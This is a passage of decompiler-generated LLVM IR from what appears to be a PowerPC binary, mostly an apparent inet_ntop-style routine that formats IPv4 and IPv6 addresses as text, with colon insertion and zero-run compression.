  %v0_1000c530 = call i32 @function_10007284()
  store i32 %v0_1000c530, i32* %r3.global-to-local, align 4
  %v1_1000c534 = load i32, i32* @r30, align 4
  %v3_1000c534 = icmp ugt i32 %v0_1000c530, %v1_1000c534
  br i1 %v3_1000c534, label %dec_label_pc_1000c53c, label %dec_label_pc_1000c550

dec_label_pc_1000c53c:                            ; preds = %dec_label_pc_1000c51c
  %v0_1000c53c = call i32 @function_10004e38()
  store i32 %v0_1000c53c, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000c548 = inttoptr i32 %v0_1000c53c to i32*
  store i32 28, i32* %v2_1000c548, align 4
  %v0_1000c564.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c560

dec_label_pc_1000c550:                            ; preds = %dec_label_pc_1000c51c
  %v0_1000c550 = load i32, i32* @r29, align 4
  store i32 %v0_1000c550, i32* %r3.global-to-local, align 4
  store i32 %v2_1000c51c, i32* %r4.global-to-local, align 4
  %v2_1000c558 = bitcast i16* %stack_var_-56 to i8*
  %v3_1000c558 = call i32 @function_10007264(i32 %v0_1000c550, i8* %v2_1000c558)
  store i32 %v3_1000c558, i32* %r3.global-to-local, align 4
  store i32 %v3_1000c558, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c560

dec_label_pc_1000c560:                            ; preds = %dec_label_pc_1000c53c, %dec_label_pc_1000c550
  %v0_1000c564 = phi i32 [ %v0_1000c564.pre, %dec_label_pc_1000c53c ], [ %v3_1000c558, %dec_label_pc_1000c550 ]
  store i32 %v0_1000c41c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c564, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000c564

; uselistorder directives
  uselistorder i32 %v0_1000c564, { 1, 0 }
  uselistorder i32 %v2_1000c51c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000c518, { 1, 0 }
  uselistorder i32 %v2_1000c514, { 1, 0 }
  uselistorder i32 %v0_1000c4e8, { 1, 0, 2 }
  uselistorder i32 %v3_1000c4e4, { 1, 0 }
  uselistorder i32 %v1_1000c4ac, { 1, 0, 2 }
  uselistorder i32 %v2_1000c49c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1000c488, { 1, 0 }
  uselistorder i32 %v0_1000c474, { 1, 0 }
  uselistorder i32 %v0_1000c5142, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14 }
  uselistorder i32 15, { 0, 1, 7, 6, 4, 5, 2, 3 }
  uselistorder label %dec_label_pc_1000c560, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4e4, { 2, 1, 0 }
}

define i32 @function_1000c578(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c578:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1000c580 = icmp slt i32 %arg1, 2
  %v3_1000c580 = icmp eq i32 %arg1, 2
  store i1 %v1_1000c580, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c580, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000c580, label %dec_label_pc_1000c5a8, label %dec_label_pc_1000c59c

dec_label_pc_1000c59c:                            ; preds = %dec_label_pc_1000c578
  %v1_1000c59c = icmp slt i32 %arg1, 10
  %v3_1000c59c = icmp eq i32 %arg1, 10
  store i1 %v1_1000c59c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c59c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c59c, label %dec_label_pc_1000c5e0.lr.ph, label %dec_label_pc_1000c7f4

dec_label_pc_1000c5a8:                            ; preds = %dec_label_pc_1000c578
  store i32 ptrtoint (i32* @global_var_1000c5b8.346 to i32), i32* @lr, align 4
  %v3_1000c5b4 = call i32 @function_1000c418(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000c7ec

dec_label_pc_1000c5e0.lr.ph:                      ; preds = %dec_label_pc_1000c59c
  %v2_1000c5bc = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000c5bc, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000c5d0.347 to i32), i32* @lr, align 4
  %v3_1000c5cc = call i32 @function_100071a0(i32 %v2_1000c5bc, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000c60015 = load i32, i32* @r27, align 4
  store i32 %v0_1000c60015, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c5e0

dec_label_pc_1000c5e0:                            ; preds = %dec_label_pc_1000c5e0.lr.ph, %dec_label_pc_1000c5e0
  %v1_1000c5f4 = phi i32 [ 0, %dec_label_pc_1000c5e0.lr.ph ], [ %v1_1000c604, %dec_label_pc_1000c5e0 ]
  %v0_1000c5e0 = phi i32 [ %v0_1000c60015, %dec_label_pc_1000c5e0.lr.ph ], [ %v0_1000c600, %dec_label_pc_1000c5e0 ]
  %v0_1000c5e8 = phi i32 [ %v0_1000c60015, %dec_label_pc_1000c5e0.lr.ph ], [ %v2_1000c600, %dec_label_pc_1000c5e0 ]
  %v1_1000c5e0 = phi i32 [ 0, %dec_label_pc_1000c5e0.lr.ph ], [ %v0_1000c5f8, %dec_label_pc_1000c5e0 ]
  %v2_1000c5e0 = add i32 %v0_1000c5e0, %v1_1000c5e0
  %v3_1000c5e0 = inttoptr i32 %v2_1000c5e0 to i8*
  %v4_1000c5e0 = load i8, i8* %v3_1000c5e0, align 1
  %v5_1000c5e0 = zext i8 %v4_1000c5e0 to i32
  %v1_1000c5e4 = add i32 %v1_1000c5e0, 2
  store i32 %v1_1000c5e4, i32* %r11.global-to-local, align 4
  %v1_1000c5e8 = add i32 %v0_1000c5e8, 1
  %v2_1000c5e8 = inttoptr i32 %v1_1000c5e8 to i8*
  %v3_1000c5e8 = load i8, i8* %v2_1000c5e8, align 1
  %v4_1000c5e8 = zext i8 %v3_1000c5e8 to i32
  %v1_1000c5ec = mul nuw nsw i32 %v5_1000c5e0, 256
  %v2_1000c5f0 = or i32 %v4_1000c5e8, %v1_1000c5ec
  %v2_1000c5f4 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000c5f4 = add i32 %v2_1000c5f4, %v1_1000c5f4
  %v4_1000c5f4 = inttoptr i32 %v3_1000c5f4 to i32*
  store i32 %v2_1000c5f0, i32* %v4_1000c5f4, align 4
  %v0_1000c5f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c5f8 = udiv i32 %v0_1000c5f8, 2
  %v0_1000c600 = load i32, i32* @r27, align 4
  %v2_1000c600 = add i32 %v0_1000c600, %v0_1000c5f8
  store i32 %v2_1000c600, i32* %r9.global-to-local, align 4
  %v1_1000c604 = mul i32 %v1_1000c5f8, 4
  %v0_1000c608 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c608 = add i32 %v0_1000c608, -1
  store i32 %v1_1000c608, i32* %ctr.global-to-local, align 4
  %v2_1000c608 = icmp eq i32 %v1_1000c608, 0
  br i1 %v2_1000c608, label %dec_label_pc_1000c628.lr.ph, label %dec_label_pc_1000c5e0

dec_label_pc_1000c628.lr.ph:                      ; preds = %dec_label_pc_1000c5e0
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c628

dec_label_pc_1000c628:                            ; preds = %dec_label_pc_1000c628.lr.ph, %dec_label_pc_1000c674
  %v0_1000c678 = phi i32 [ 8, %dec_label_pc_1000c628.lr.ph ], [ %v1_1000c678, %dec_label_pc_1000c674 ]
  %v0_1000c668 = phi i32 [ -1, %dec_label_pc_1000c628.lr.ph ], [ %v0_1000c66842, %dec_label_pc_1000c674 ]
  %v0_1000c658 = phi i32 [ -1, %dec_label_pc_1000c628.lr.ph ], [ %v0_1000c65839, %dec_label_pc_1000c674 ]
  %v0_1000c62c = phi i32 [ -1, %dec_label_pc_1000c628.lr.ph ], [ %v0_1000c62c35, %dec_label_pc_1000c674 ]
  %v0_1000c674 = phi i32 [ 0, %dec_label_pc_1000c628.lr.ph ], [ %v1_1000c674, %dec_label_pc_1000c674 ]
  %v1_1000c628 = mul i32 %v0_1000c674, 4
  %v3_1000c62c = icmp eq i32 %v0_1000c62c, -1
  %v2_1000c630 = add i32 %v1_1000c628, %v2_1000c5bc
  %v3_1000c630 = inttoptr i32 %v2_1000c630 to i32*
  %v4_1000c630 = load i32, i32* %v3_1000c630, align 4
  %v3_1000c634 = icmp eq i32 %v4_1000c630, 0
  br i1 %v3_1000c634, label %dec_label_pc_1000c63c, label %dec_label_pc_1000c654

dec_label_pc_1000c63c:                            ; preds = %dec_label_pc_1000c628
  br i1 %v3_1000c62c, label %dec_label_pc_1000c640, label %dec_label_pc_1000c64c

dec_label_pc_1000c640:                            ; preds = %dec_label_pc_1000c63c
  store i32 %v0_1000c674, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000c674

dec_label_pc_1000c64c:                            ; preds = %dec_label_pc_1000c63c
  %v0_1000c64c = load i32, i32* @r31, align 4
  %v1_1000c64c = add i32 %v0_1000c64c, 1
  store i32 %v1_1000c64c, i32* @r31, align 4
  br label %dec_label_pc_1000c674

dec_label_pc_1000c654:                            ; preds = %dec_label_pc_1000c628
  br i1 %v3_1000c62c, label %dec_label_pc_1000c674, label %dec_label_pc_1000c658

dec_label_pc_1000c658:                            ; preds = %dec_label_pc_1000c654
  %v3_1000c658 = icmp eq i32 %v0_1000c658, -1
  %v0_1000c66c.pre = load i32, i32* @r31, align 4
  %v1_1000c660 = load i32, i32* @r30, align 4
  %v3_1000c660 = icmp sgt i32 %v0_1000c66c.pre, %v1_1000c660
  %or.cond = or i1 %v3_1000c658, %v3_1000c660
  br i1 %or.cond, label %dec_label_pc_1000c668, label %dec_label_pc_1000c670

dec_label_pc_1000c668:                            ; preds = %dec_label_pc_1000c658
  store i32 %v0_1000c668, i32* @r28, align 4
  store i32 %v0_1000c66c.pre, i32* @r30, align 4
  br label %dec_label_pc_1000c670

dec_label_pc_1000c670:                            ; preds = %dec_label_pc_1000c658, %dec_label_pc_1000c668
  %v0_1000c65840 = phi i32 [ %v0_1000c668, %dec_label_pc_1000c668 ], [ %v0_1000c658, %dec_label_pc_1000c658 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c674

dec_label_pc_1000c674:                            ; preds = %dec_label_pc_1000c654, %dec_label_pc_1000c64c, %dec_label_pc_1000c640, %dec_label_pc_1000c670
  %v0_1000c66842 = phi i32 [ %v0_1000c668, %dec_label_pc_1000c654 ], [ %v0_1000c668, %dec_label_pc_1000c64c ], [ %v0_1000c674, %dec_label_pc_1000c640 ], [ -1, %dec_label_pc_1000c670 ]
  %v0_1000c62c35 = phi i32 [ -1, %dec_label_pc_1000c654 ], [ %v0_1000c62c, %dec_label_pc_1000c64c ], [ %v0_1000c674, %dec_label_pc_1000c640 ], [ -1, %dec_label_pc_1000c670 ]
  %v0_1000c65839 = phi i32 [ %v0_1000c658, %dec_label_pc_1000c654 ], [ %v0_1000c658, %dec_label_pc_1000c64c ], [ %v0_1000c658, %dec_label_pc_1000c640 ], [ %v0_1000c65840, %dec_label_pc_1000c670 ]
  %v1_1000c674 = add nuw nsw i32 %v0_1000c674, 1
  store i32 %v1_1000c674, i32* %r11.global-to-local, align 4
  %v1_1000c678 = add nsw i32 %v0_1000c678, -1
  store i32 %v1_1000c678, i32* %ctr.global-to-local, align 4
  %v2_1000c678 = icmp eq i32 %v1_1000c678, 0
  br i1 %v2_1000c678, label %dec_label_pc_1000c67c, label %dec_label_pc_1000c628

dec_label_pc_1000c67c:                            ; preds = %dec_label_pc_1000c674
  %v3_1000c67c = icmp eq i32 %v0_1000c66842, -1
  %v1_1000c69c = icmp slt i32 %v0_1000c65839, -1
  %v3_1000c69c = icmp eq i32 %v0_1000c65839, -1
  store i1 %v1_1000c69c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c69c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c67c, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c684

dec_label_pc_1000c684:                            ; preds = %dec_label_pc_1000c67c
  %v0_1000c694.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000c69c, label %dec_label_pc_1000c694, label %dec_label_pc_1000c68c

dec_label_pc_1000c68c:                            ; preds = %dec_label_pc_1000c684
  %v1_1000c68c = load i32, i32* @r30, align 4
  %v2_1000c68c = icmp slt i32 %v0_1000c694.pre, %v1_1000c68c
  %v3_1000c68c = icmp sgt i32 %v0_1000c694.pre, %v1_1000c68c
  %v4_1000c68c = icmp eq i32 %v0_1000c694.pre, %v1_1000c68c
  store i1 %v2_1000c68c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c68c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c68c, label %dec_label_pc_1000c694, label %dec_label_pc_1000c69c.thread

dec_label_pc_1000c694:                            ; preds = %dec_label_pc_1000c684, %dec_label_pc_1000c68c
  store i32 %v0_1000c694.pre, i32* @r30, align 4
  store i32 %v0_1000c66842, i32* @r28, align 4
  br label %dec_label_pc_1000c69c.thread

dec_label_pc_1000c69c.thread:                     ; preds = %dec_label_pc_1000c694, %dec_label_pc_1000c68c
  %v0_1000c6a476 = phi i32 [ %v1_1000c68c, %dec_label_pc_1000c68c ], [ %v0_1000c694.pre, %dec_label_pc_1000c694 ]
  %v0_1000c69c.ph = phi i32 [ %v0_1000c65839, %dec_label_pc_1000c68c ], [ %v0_1000c66842, %dec_label_pc_1000c694 ]
  %v1_1000c69c59 = icmp slt i32 %v0_1000c69c.ph, -1
  %v3_1000c69c61 = icmp eq i32 %v0_1000c69c.ph, -1
  store i1 %v1_1000c69c59, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c69c61, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000c6a4

dec_label_pc_1000c69c:                            ; preds = %dec_label_pc_1000c67c
  br i1 %v3_1000c69c, label %dec_label_pc_1000c6b0, label %dec_label_pc_1000c69c.dec_label_pc_1000c6a4_crit_edge

dec_label_pc_1000c69c.dec_label_pc_1000c6a4_crit_edge: ; preds = %dec_label_pc_1000c69c
  %v0_1000c6a4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c6a4

dec_label_pc_1000c6a4:                            ; preds = %dec_label_pc_1000c69c.dec_label_pc_1000c6a4_crit_edge, %dec_label_pc_1000c69c.thread
  %v0_1000c6a4 = phi i32 [ %v0_1000c6a476, %dec_label_pc_1000c69c.thread ], [ %v0_1000c6a4.pre, %dec_label_pc_1000c69c.dec_label_pc_1000c6a4_crit_edge ]
  %v0_1000c69c62 = phi i32 [ %v0_1000c69c.ph, %dec_label_pc_1000c69c.thread ], [ %v0_1000c65839, %dec_label_pc_1000c69c.dec_label_pc_1000c6a4_crit_edge ]
  %v1_1000c6a4 = icmp slt i32 %v0_1000c6a4, 1
  %v2_1000c6a4 = icmp sgt i32 %v0_1000c6a4, 1
  %v3_1000c6a4 = icmp eq i32 %v0_1000c6a4, 1
  store i1 %v1_1000c6a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c6a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c6a4, label %dec_label_pc_1000c6b0, label %dec_label_pc_1000c6ac

dec_label_pc_1000c6ac:                            ; preds = %dec_label_pc_1000c6a4
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000c6b0

dec_label_pc_1000c6b0:                            ; preds = %dec_label_pc_1000c6a4, %dec_label_pc_1000c69c, %dec_label_pc_1000c6ac
  %v0_1000c6bc3 = phi i32 [ %v0_1000c69c62, %dec_label_pc_1000c6a4 ], [ -1, %dec_label_pc_1000c69c ], [ -1, %dec_label_pc_1000c6ac ]
  %v2_1000c6b0 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000c6b0, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000c6bc4 = icmp slt i32 %v0_1000c6bc3, -1
  %v3_1000c6bc6 = icmp eq i32 %v0_1000c6bc3, -1
  store i1 %v1_1000c6bc4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c6bc6, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c72c = icmp slt i32 %tmp, 65535
  %v4_1000c72c = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000c6bc

dec_label_pc_1000c6bc:                            ; preds = %dec_label_pc_1000c6b0, %dec_label_pc_1000c788
  %v2_1000c6f8 = phi i32 [ %v2_1000c6b0, %dec_label_pc_1000c6b0 ], [ %v2_1000c6e051, %dec_label_pc_1000c788 ]
  %v0_1000c6cc = phi i32 [ %v0_1000c6bc3, %dec_label_pc_1000c6b0 ], [ %v0_1000c6bc, %dec_label_pc_1000c788 ]
  %v0_1000c6ec = phi i32 [ 0, %dec_label_pc_1000c6b0 ], [ %v1_1000c788, %dec_label_pc_1000c788 ]
  %v3_1000c6bc7 = phi i1 [ %v3_1000c6bc6, %dec_label_pc_1000c6b0 ], [ %v3_1000c6bc, %dec_label_pc_1000c788 ]
  br i1 %v3_1000c6bc7, label %dec_label_pc_1000c6ec, label %dec_label_pc_1000c6c4

dec_label_pc_1000c6c4:                            ; preds = %dec_label_pc_1000c6bc
  %v2_1000c6c4 = icmp slt i32 %v0_1000c6ec, %v0_1000c6cc
  %v4_1000c6c4 = icmp eq i32 %v0_1000c6ec, %v0_1000c6cc
  br i1 %v2_1000c6c4, label %dec_label_pc_1000c6ec, label %dec_label_pc_1000c6cc

dec_label_pc_1000c6cc:                            ; preds = %dec_label_pc_1000c6c4
  %v1_1000c6cc = load i32, i32* @r30, align 4
  %v2_1000c6cc = add i32 %v1_1000c6cc, %v0_1000c6cc
  %v2_1000c6d0 = icmp slt i32 %v0_1000c6ec, %v2_1000c6cc
  %v4_1000c6d0 = icmp eq i32 %v0_1000c6ec, %v2_1000c6cc
  store i1 %v2_1000c6d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c6d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c6d0, label %dec_label_pc_1000c6d8, label %dec_label_pc_1000c6ec

dec_label_pc_1000c6d8:                            ; preds = %dec_label_pc_1000c6cc
  br i1 %v4_1000c6c4, label %dec_label_pc_1000c6dc, label %dec_label_pc_1000c788

dec_label_pc_1000c6dc:                            ; preds = %dec_label_pc_1000c6d8
  %v3_1000c6e0 = inttoptr i32 %v2_1000c6f8 to i8*
  store i8 58, i8* %v3_1000c6e0, align 1
  %v0_1000c6e4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c6e4 = add i32 %v0_1000c6e4, 1
  store i32 %v1_1000c6e4, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c788

dec_label_pc_1000c6ec:                            ; preds = %dec_label_pc_1000c6cc, %dec_label_pc_1000c6c4, %dec_label_pc_1000c6bc
  %v1_1000c6ec = icmp slt i32 %v0_1000c6ec, 0
  %v3_1000c6ec = icmp eq i32 %v0_1000c6ec, 0
  store i1 %v1_1000c6ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c6ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c6ec, label %dec_label_pc_1000c700.thread, label %dec_label_pc_1000c700

dec_label_pc_1000c700.thread:                     ; preds = %dec_label_pc_1000c6ec
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000c764

dec_label_pc_1000c700:                            ; preds = %dec_label_pc_1000c6ec
  %v3_1000c6f8 = inttoptr i32 %v2_1000c6f8 to i8*
  store i8 58, i8* %v3_1000c6f8, align 1
  %v0_1000c6fc = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c6fc = add i32 %v0_1000c6fc, 1
  store i32 %v1_1000c6fc, i32* %r29.global-to-local, align 4
  %v0_1000c700.pre = load i32, i32* @r31, align 4
  %v1_1000c700 = icmp slt i32 %v0_1000c700.pre, 6
  %v3_1000c700 = icmp eq i32 %v0_1000c700.pre, 6
  store i1 %v1_1000c700, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c700, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c700, label %dec_label_pc_1000c708, label %dec_label_pc_1000c764

dec_label_pc_1000c708:                            ; preds = %dec_label_pc_1000c700
  %v0_1000c708 = load i32, i32* @r28, align 4
  %v1_1000c708 = icmp slt i32 %v0_1000c708, 0
  %v3_1000c708 = icmp eq i32 %v0_1000c708, 0
  store i1 %v1_1000c708, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c708, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c708, label %dec_label_pc_1000c710, label %dec_label_pc_1000c764

dec_label_pc_1000c710:                            ; preds = %dec_label_pc_1000c708
  %v0_1000c710 = load i32, i32* @r30, align 4
  %v1_1000c710 = icmp slt i32 %v0_1000c710, 6
  %v3_1000c710 = icmp eq i32 %v0_1000c710, 6
  store i1 %v1_1000c710, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c710, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c710, label %dec_label_pc_1000c734, label %dec_label_pc_1000c718

dec_label_pc_1000c718:                            ; preds = %dec_label_pc_1000c710
  %v1_1000c718 = icmp slt i32 %v0_1000c710, 5
  %v3_1000c718 = icmp eq i32 %v0_1000c710, 5
  store i1 %v1_1000c718, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c718, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c718, label %dec_label_pc_1000c720, label %dec_label_pc_1000c764

dec_label_pc_1000c720:                            ; preds = %dec_label_pc_1000c718
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000c72c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c72c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000c72c, label %dec_label_pc_1000c734, label %dec_label_pc_1000c764

dec_label_pc_1000c734:                            ; preds = %dec_label_pc_1000c720, %dec_label_pc_1000c710
  %v1_1000c734 = load i32, i32* @r1, align 4
  %v2_1000c734 = sub i32 %v1_1000c734, %v1_1000c6fc
  %v0_1000c738 = load i32, i32* @r27, align 4
  %v1_1000c738 = add i32 %v0_1000c738, 12
  %v1_1000c73c = add i32 %v2_1000c734, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000c748.348 to i32), i32* @lr, align 4
  %v3_1000c744 = call i32 @function_1000c418(i32 %v1_1000c738, i32 %v1_1000c6fc, i32 %v1_1000c73c)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000c74c = icmp slt i32 %v3_1000c744, 0
  %v3_1000c74c = icmp eq i32 %v3_1000c744, 0
  store i1 %v1_1000c74c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c74c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c74c, label %dec_label_pc_1000c804, label %dec_label_pc_1000c754

dec_label_pc_1000c754:                            ; preds = %dec_label_pc_1000c734
  %v0_1000c754 = load i32, i32* @r29, align 4
  store i32 %v0_1000c754, i32* @r3, align 4
  %v0_1000c758 = call i32 @function_10007284()
  %v0_1000c75c = load i32, i32* @r29, align 4
  %v2_1000c75c = add i32 %v0_1000c75c, %v0_1000c758
  store i32 %v2_1000c75c, i32* %r29.global-to-local, align 4
  %v0_1000c79c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c79c

dec_label_pc_1000c764:                            ; preds = %dec_label_pc_1000c700.thread, %dec_label_pc_1000c720, %dec_label_pc_1000c718, %dec_label_pc_1000c708, %dec_label_pc_1000c700
  %v0_1000c76467 = phi i32 [ 0, %dec_label_pc_1000c700.thread ], [ 6, %dec_label_pc_1000c720 ], [ 6, %dec_label_pc_1000c718 ], [ 6, %dec_label_pc_1000c708 ], [ %v0_1000c700.pre, %dec_label_pc_1000c700 ]
  %v0_1000c74066 = phi i32 [ %v2_1000c6f8, %dec_label_pc_1000c700.thread ], [ %v1_1000c6fc, %dec_label_pc_1000c720 ], [ %v1_1000c6fc, %dec_label_pc_1000c718 ], [ %v1_1000c6fc, %dec_label_pc_1000c708 ], [ %v1_1000c6fc, %dec_label_pc_1000c700 ]
  %v1_1000c764 = mul i32 %v0_1000c76467, 4
  store i32 %v2_1000c5bc, i32* %r9.global-to-local, align 4
  %v2_1000c76c = add i32 %v1_1000c764, %v2_1000c5bc
  %v3_1000c76c = inttoptr i32 %v2_1000c76c to i32*
  %v4_1000c76c = load i32, i32* %v3_1000c76c, align 4
  store i32 %v0_1000c74066, i32* @r3, align 4
  store i32 268486532, i32* @lr, align 4
  %v5_1000c780 = call i32 @function_10004fac(i32 %v0_1000c74066, i32 ptrtoint ([3 x i8]* @global_var_1000f91c.349 to i32), i32 %v4_1000c76c, i32 %v2_1000c5bc)
  %v0_1000c784 = load i32, i32* @r29, align 4
  %v2_1000c784 = add i32 %v0_1000c784, %v5_1000c780
  store i32 %v2_1000c784, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c788

dec_label_pc_1000c788:                            ; preds = %dec_label_pc_1000c6d8, %dec_label_pc_1000c6dc, %dec_label_pc_1000c764
  %v2_1000c6e051 = phi i32 [ %v2_1000c6f8, %dec_label_pc_1000c6d8 ], [ %v1_1000c6e4, %dec_label_pc_1000c6dc ], [ %v2_1000c784, %dec_label_pc_1000c764 ]
  %v0_1000c788 = load i32, i32* @r31, align 4
  %v1_1000c788 = add i32 %v0_1000c788, 1
  store i32 %v1_1000c788, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000c788, 8
  %v0_1000c6bc = load i32, i32* @r28, align 4
  %v1_1000c6bc = icmp slt i32 %v0_1000c6bc, -1
  %v3_1000c6bc = icmp eq i32 %v0_1000c6bc, -1
  store i1 %v1_1000c6bc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c6bc, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000c6bc, label %dec_label_pc_1000c794

dec_label_pc_1000c794:                            ; preds = %dec_label_pc_1000c788
  br i1 %v3_1000c6bc, label %dec_label_pc_1000c7b4, label %dec_label_pc_1000c79c

dec_label_pc_1000c79c:                            ; preds = %dec_label_pc_1000c794, %dec_label_pc_1000c754
  %v2_1000c7ac = phi i32 [ %v2_1000c6e051, %dec_label_pc_1000c794 ], [ %v2_1000c75c, %dec_label_pc_1000c754 ]
  %v0_1000c79c = phi i32 [ %v0_1000c6bc, %dec_label_pc_1000c794 ], [ %v0_1000c79c.pre, %dec_label_pc_1000c754 ]
  %v1_1000c79c = load i32, i32* @r30, align 4
  %v2_1000c79c = add i32 %v1_1000c79c, %v0_1000c79c
  %v1_1000c7a0 = icmp slt i32 %v2_1000c79c, 8
  %v3_1000c7a0 = icmp eq i32 %v2_1000c79c, 8
  store i1 %v1_1000c7a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c7a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c7a0, label %dec_label_pc_1000c7a8, label %dec_label_pc_1000c7b4

dec_label_pc_1000c7a8:                            ; preds = %dec_label_pc_1000c79c
  %v3_1000c7ac = inttoptr i32 %v2_1000c7ac to i8*
  store i8 58, i8* %v3_1000c7ac, align 1
  %v0_1000c7b0 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c7b0 = add i32 %v0_1000c7b0, 1
  store i32 %v1_1000c7b0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c7b4

dec_label_pc_1000c7b4:                            ; preds = %dec_label_pc_1000c79c, %dec_label_pc_1000c794, %dec_label_pc_1000c7a8
  %v2_1000c7c8 = phi i32 [ %v2_1000c7ac, %dec_label_pc_1000c79c ], [ %v2_1000c6e051, %dec_label_pc_1000c794 ], [ %v1_1000c7b0, %dec_label_pc_1000c7a8 ]
  %v1_1000c7b4 = sub i32 1, %v2_1000c6b0
  %v2_1000c7bc = add i32 %v1_1000c7b4, %v2_1000c7c8
  %v1_1000c7c0 = load i32, i32* @r26, align 4
  %v2_1000c7c0 = icmp ult i32 %v2_1000c7bc, %v1_1000c7c0
  %v4_1000c7c0 = icmp eq i32 %v2_1000c7bc, %v1_1000c7c0
  store i1 %v2_1000c7c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c7c0, i1* %cr7_eq.global-to-local, align 1
  %v3_1000c7c8 = inttoptr i32 %v2_1000c7c8 to i8*
